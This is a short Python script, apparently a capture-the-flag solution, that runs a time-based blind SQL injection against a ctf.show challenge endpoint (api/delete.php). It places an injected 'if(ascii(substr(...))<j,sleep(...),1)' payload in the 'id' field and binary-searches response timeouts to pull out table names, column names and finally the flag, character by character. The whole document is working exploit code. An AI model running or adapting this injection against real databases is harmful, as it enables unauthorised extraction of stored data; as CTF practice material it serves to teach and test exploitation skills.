import requests
import time
url='http://9c9ca764-e935-4d20-b1bb-69d52ab26735.challenge.ctf.show/api/delete.php'

flag=''
for i in range(1,100):
    min=32
    max=128
    while 1:
        j=min+(max-min)//2
        if min==j:
            flag+=chr(j)
            print(flag)
            break

        #payload=f"if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))<{j},sleep(0.02),1)"
        #payload=f"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),{i},1))<{j},sleep(0.02),1)"
        payload=f"if(ascii(substr((select group_concat(flag) from flag),{i},1))<{j},sleep(0.02),1)"

        data={
            'id':payload
        }
        try:
            r=requests.post(url=url,data=data,timeout=0.38)
            min=j
        except:
            max=j

        time.sleep(0.2)